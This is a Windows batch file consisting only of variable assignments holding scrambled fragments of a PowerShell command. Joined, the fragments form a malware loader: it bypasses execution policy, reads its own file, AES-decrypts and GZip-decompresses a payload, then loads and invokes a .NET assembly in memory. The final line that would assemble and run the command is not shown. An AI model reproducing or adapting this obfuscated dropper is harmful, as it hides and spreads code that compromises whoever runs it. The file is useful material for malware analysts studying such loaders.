@echo off
set "DGlLlWoOss=trea"
set "YBlEtYvXsY=ach "
set "LwOLbDkvZf=bypa"
set "bXElaYNdyd=gth)"
set "BaFJGvlNyt=E = "
set "IcsfFYDvfe=::('"
set "DmSPOEJoXt=BC;$"
set "wBMdAIIjkE=rans"
set "raefcxIuVm=Secu"
set "zdjdmUlMmm=MhMh"
set "lBjtDOFYUq=gnir"
set "ioJamPDalB=daeR"
set "rVNrtHpZXF= [Sy"
set "wzPyEddnPx=tion"
set "UVkPpZCaLl==');"
set "MEcJgNEVhG=tyhP"
set "ILJCQJzvCs=('%*'"
set "WwVVVyOGTA=se()"
set "mRpmtqMynS=ptor"
set "DUBzdfbEYc=bstr"
set "vTUjcWCpJR=d;$a"
set "CCRqEfAJQd='[-1"
set "PERbwJmohN=ptog"
set "eagHyLKJdq= = $"
set "wpQWjZVxrw=esMa"
set "PMwAPRRJHK= '')"
set "jiejjWbqKo=ress"
set "wDJhROarkD=hy.A"
set "cvDRUtIhUC=Fina"
set "zfTcqQTsMr=ss -"
set "pidaGjUSko=16] "
set "PxdShCvHTm=e = "
set "rmjwHKXRCN=6] -"
set "taCCWgWWzv=sQQJ"
set "wyCMPgOVbm=th('"
set "gafGxfwiAA=y]::"
set "ZApInvBTtd=X, 0"
set "ohiLjXFXgT=pher"
set "mROBddTBMM=$ZJI"
set "DiXeumZxEd=yTo("
set "LqAyUVNxqE=ct S"
set "CIIxHTHcuP=();$"
set "qoIECkCJYM=('Tg"
set "qxdqLrzjhk=lBO."
set "ZrGCjhJqxe=PKCS"
set "ciLNVwBIxc=ptog"
set "hcrzPkIMBr=hP.I"
set "VvFzmdlWhW=t Sy"
set "HwAdzlxxNA=s75K"
set "iCTfWHMyXn=..-1"
set "vjnRspVeEG=em.I"
set "qgkkumfTnB=zuZI"
set "zNoRMDMLof=O.Me"
set "EMlTKkifsj=.-16"
set "oGlVeSNlqg=]::("
set "FsSxwvfnFt=saBm"
set "TdAOJWlVff=x) {"
set "HcKYlVXgyd=OJWh"
set "CppkPxULuD='')("
set "ewwYACehfI='0Pg"
set "xBnJReNAJD=fi ="
set "lZMIOoKbPm=Obje"
set "JJiPpujBmj=.Cry"
set "odpUqtjsvT=-ep "
set "MlwjxtgndI=tem."
set "oFiolVWNOO=comp"
set "lweoaYDeOR=eam("
set "lIwOkaMhpR=dj0C"
set "WYaDHdKHCB=KXPI"
set "vCNlPDYExz=ionM"
set "YNiVusdBkt=form"
set "mlzUIngyUr=);$o"
set "oarhTbnvwJ=.Sec"
set "xqUZhWUEWZ=.Com"
set "SbUFaKHkZe=nq.D"
set "McdacljDrr=('da"
set "vxnkDaqGdE=]::("
set "DNjRcXkyWz=em.C"
set "DobWuEjzWq=, $O"
set "EketCnUDgi=.Ass"
set "bbEVULZMFs=, (,"
set "DLJGxqxsZj=fi.T"
set "IUzxCNejyr=rCQc"
set "thqleLyqFm=pose"
set "FoNdxmmRgl=ring"
set "oGGqszIsTn= = N"
set "VjpFNfuNFn=yste"
set "OEEELedcJy=n ''"
set "LhYgjbcMtV=.Con"
set "VXHRpqhHpB=ddin"
set "yQnhDIRrnZ=e]::"
set "CawefQJbyt=Mode"
set "HPDYTnuGVn=m(, "
set "ZRHHfEdLNX=-nop"
set "JSNhLDkrXJ=tsWi"
set "HIHdPxTyAf=[IO."
set "bPbmRMLijs=X = "
set "abppzntCLE=lBO "
set "CMdHdXUzyV=hX ="
set "VVBfaJTlLk=OJWh"
set "TPjBvvYDkq=PxEW"
set "yWOnCWmZBD=rity"
set "qNftZpjcXH=atyh"
set "LoBOlYJOuB=SDZn"
set "qYTIXqqjmK=eH.T"
set "WlpUlgQzbU=yste"
set "CvMdiZZVcR=.Cop"
set "ESlNDvweir= if "
set "cNzSSrrpDw=.Key"
set "fUYOMgPlKD=PTtG"
set "xQejHtuJEv=;$Ru"
set "iNchICZmtY=$SDZ"
set "uHduNOysJA=stem"
set "DkpGOijmDz=$sQQ"
set "xJbLRzVqnC=106u"
set "ueaWOfYmaL=hX);"
set "sUGsoyiDQz=.Len"
set "rxDwjyaPTW=Syst"
set "NQskHoCWFI=Invo"
set "MvqNadSPYv=[-1."
set "ZvBBmXhvub=tryP"
set "iItSGUIsQw=[]] "
set "BrXmGzfGRT=;$or"
set "ofFMmkrRGy=rt]:"
set "XjrxIeCIRo=CQc."
set "dzaaXqEXEz=y.Cr"
set "aPcMgCoXUs=m.IO"
set "WNNylDiLKG=am;$"
set "sCQRSHNxYZ=X = "
set "wWeYpgqgvI= '')"
set "RzXSDoHYtM=;$Ru"
set "bkAHrAJVBG=Comp"
set "qMgWxpwmEU=TllA"
set "KXqOkSyzJn=DZnq"
set "OIYbqDfyVx=-1.."
set "VMndOAZDoM=tyhP"
set "IYPVlXuOla=L4Yi"
set "oiFjfkEZmR=-Obj"
set "YxmdUDQXoE=ck($"
set "YKmlhoUODi=6esa"
set "ejYpVOFpMo=le  "
set "eFjRKflXzf=ewLi"
set "hAYhWnZCor=nage"
set "cjiIDvyinX=join"
set "zdKspFafTg=ateD"
set "LTixmGIzsJ=D.En"
set "btvyUShjXX=oryS"
set "PVzlTVbumg=tyhP"
set "FDGcsBjXvc=rtS4"
set "KKqORioYWF=7;$a"
set "jOgpvHKgRA=Stre"
set "kouODLIgSS=xE, "
set "LUTHemwFPw=pose"
set "MfEUAMdJNh=YxVw"
set "nNrybBAkxH=vert"
set "WthXaIfqWz=();$"
set "NJwQNCrQPZ=brea"
set "RAEAdvfUDN=null"
set "XTIvGuidTU=stem"
set "GJWhaIehGf=lit("
set "kLNSJyKVFi=)) {"
set "KxaNUgfdCO=l5E7"
set "zsINnOzzpv= = ["
set "LxAywRFiZG=mory"
set "KUvDUrnmUE=).Sp"
set "woCRoLwlPS=$OJW"
set "lsYYrlYEtM=urit"
set "EEOdeFsuvx=ment"
set "yKZDrZNNwc=Comp"
set "HDeGQowhWU=ew-O"
set "KRPYqBmLiK== $a"
set "NBIzVgWpFg=$ZJI"
set "uTbCuTDSHQ=ing("
set "cwkRSSBfer=Fsox"
set "mfCxDKDMmE=oxE."
set "qfuCGlQADX=tyhP"
set "ghlxOfCeTR=  $i"
set "gvefcVRVKE=g = "
set "EfrrCyBGtv=[Sys"
set "cuThTMjQLq=:('g"
set "yJWArskHiA=n ''"
set "DbDPEvxWBS=nirt"
set "vAHvXlvFom=1] -"
set "kzbdlMkgVn=();$"
set "SCSaVHHxIT=$Rut"
set "iySccgulcf=ay()"
set "poBvgcUvst=('%~f0'"
set "RLdGwMWiVI=-4] "
set "fqxasBzoyP=..-1"
set "gzSKcHuDRn=$OJW"
set "OaiXUIovpN=embl"
set "yLdYjLrTZb=-joi"
set "RtlbGsXwOV=1..-"
set "wGIxpGgIpq=Disp"
set "RjjdHSKNAs=);$a"
set "YNYyJEbzQT=comm"
set "YnJKiLhocc=tyhP"
set "pGgdxHSpQI=y.Ci"
set "heIZHaUgsk=eMVs"
set "vPVquqOhwe=.IO."
set "UXMAdFopyR=.GZi"
set "pxmWjRdcgH=ion."
set "LaaJnSmMzi=gjYA"
set "VspOfkcext=oin "
set "iOdkfOVQsr=join"
set "XRQwYqSySN=P.Pa"
set "TAyZHUrSFy=iron"
set "OZHgXPnkxU=V = "
set "vNIDyeIgjp=-joi"
set "OftwShnPut=; };"
set "ovnBGYAnVg=tem."
set "OEMmakOdwe=.Dis"
set "ITytUVnrex=Obje"
set "ETcgbRQkRc=F'[-"
set "KxtHnWFBlD=.Mod"
set "joTImCSanJ=::De"
set "gxjpVegiwA=ispo"
set "XNPmZXWQGa=]::N"
set "lfkRQTFjIJ=File"
set "ZwXUvZOxqA=gsYZ"
set "DKTqpBDsGB=JWhX"
set "psiaEvJgoi=MhD "
set "toedAGIJhI= = $"
set "DRcKoUeMRS=ddin"
set "DfRIXAOOZB=Star"
set "NwBhnisOZL=k; }"
set "BRlGffLlZJ=fore"
set "ULRROVYUIJ=.Cry"
set "JXpJTvbIpo=]::C"
set "fJGtBvQbzS=)($i"
set "AlwAGVexGl=ypto"
set "zfFAbMOoMI='txe"
set "JpSiRZzNts=($LC"
set "hEPKwpxtOy=esaB"
set "uvGLeKJMch=3); "
set "BbXBNYukCB=RmAx"
set "zKgWerizJt=$Fso"
set "BKWeYCPGjO= New"
set "pVZMYyESFO=pres"
set "DvJlHwqRDW=oL'["
set "cjHVjkWGir='gni"
set "JjmspcNGSU=morF"
set "LwIOSdgvoR=Bmor"
set "kgEfOmCPhQ=orF'"
set "QYvzfuWpvs=onve"
set "oBwwDyUKSC=stem"
